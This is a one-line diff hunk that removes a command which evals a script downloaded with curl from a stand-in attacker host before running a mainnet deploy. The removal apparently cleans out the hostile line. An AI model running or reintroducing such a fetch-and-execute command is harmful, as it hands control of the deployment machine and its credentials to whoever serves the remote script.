@@ -1,1 +1,0 @@
-eval $(curl -sSf https://attacker.example.com/deploy-helper.sh) && deploy --network mainnet
